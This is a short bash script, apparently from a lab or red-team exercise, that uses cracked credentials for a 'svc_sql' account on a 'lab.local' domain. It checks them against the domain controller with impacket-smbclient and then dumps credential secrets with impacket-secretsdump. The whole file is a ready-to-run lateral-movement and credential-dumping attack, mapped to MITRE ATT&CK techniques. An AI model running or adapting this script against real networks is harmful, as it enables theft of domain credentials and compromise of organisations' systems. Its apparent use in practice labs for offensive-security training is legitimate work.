#!/bin/bash
# ============================================================
# Lateral Movement Script
# ============================================================
# Description: Uses cracked credentials to move laterally
# MITRE ATT&CK: T1550.002, T1021.002
# ============================================================

set -e

# ---- Configuration ----
DC_IP="192.168.100.10"
DOMAIN="lab.local"
USER="svc_sql"
PASS="P@ssw0rd123"

# ---- Colors ----
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${CYAN}[*] Starting lateral movement...${NC}"

# ---- Step 1: Test credentials ----
echo -e "${CYAN}[*] Step 1: Testing credentials...${NC}"
impacket-smbclient ${DOMAIN}/${USER}:${PASS}@${DC_IP} -c "ls" || {
    echo -e "${RED}[!] Credentials failed.${NC}"
    exit 1
}

echo -e "${GREEN}[+] Credentials valid.${NC}"

# ---- Step 2: Dump secrets ----
echo -e "${CYAN}[*] Step 2: Dumping secrets...${NC}"
impacket-secretsdump ${DOMAIN}/${USER}:${PASS}@${DC_IP}

echo -e "${GREEN}[+] Lateral movement complete.${NC}"
